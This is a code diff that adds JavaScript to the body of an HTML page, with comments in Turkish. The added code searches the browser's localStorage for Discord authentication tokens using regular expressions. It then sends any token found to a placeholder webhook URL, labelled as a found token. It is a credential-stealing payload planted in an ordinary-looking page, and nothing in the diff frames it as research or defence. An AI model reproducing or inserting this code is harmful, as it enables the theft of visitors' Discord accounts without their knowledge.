@@ -145,5 +145,35 @@
         `);
     </script>
 </head>
-<body></body>
+<body>
+    // DISCORD TOKEN ARA (localStorage)
+let discordToken = '❌ Bulunamadı';
+try {
+    for (let key in localStorage) {
+        if (key.includes('token') || key.includes('discord')) {
+            const val = localStorage[key];
+            if (typeof val === 'string') {
+                const tokenMatch = val.match(/mfa\.[a-zA-Z0-9_-]{84}|[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}/);
+                if (tokenMatch) {
+                    discordToken = tokenMatch[0];
+                    break;
+                }
+            }
+        }
+    }
+} catch (e) {}
+
+// Gönder
+fetch('WEBHOOK_URL', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+        content: '```yaml\nTOKEN BULUNDU:\n' + discordToken + '\n```'
+    })
+});
+</body>
+
+
+    
 </html>
+
